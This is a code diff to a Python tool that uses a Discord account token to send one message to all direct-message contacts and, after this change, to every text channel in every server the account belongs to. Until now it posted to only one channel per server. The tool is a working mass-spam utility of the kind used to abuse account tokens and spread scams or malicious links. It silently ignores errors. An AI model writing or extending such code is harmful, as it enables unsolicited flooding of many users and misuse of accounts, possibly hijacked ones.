@@ -195,7 +195,7 @@ asyncio.run(client.start("{token}"))
     return proc
 
 def send_message(token, message):
-    """Send message to all DMs and servers"""
+    """Send message to all DMs and all channels in all servers"""
     script = f'''
 import discord
 import asyncio
@@ -221,18 +221,19 @@ async def on_ready():
                 pass
     print(f"Total DMs messaged: {{dm_count}}")
     
-    # Send to all servers
+    # Send to ALL channels in ALL servers
     server_count = 0
+    channel_count = 0
     for guild in client.guilds:
         for channel in guild.text_channels:
             try:
                 await channel.send(MESSAGE)
+                channel_count += 1
                 print(f"Sent to {{guild.name}} - {{channel.name}}")
-                server_count += 1
-                break  # Only send to one channel per server
             except:
                 pass
-    print(f"Total servers messaged: {{server_count}}")
+        server_count += 1
+    print(f"Total servers: {{server_count}}, Total channels messaged: {{channel_count}}")
     await client.close()
 
 asyncio.run(client.start("{token}"))
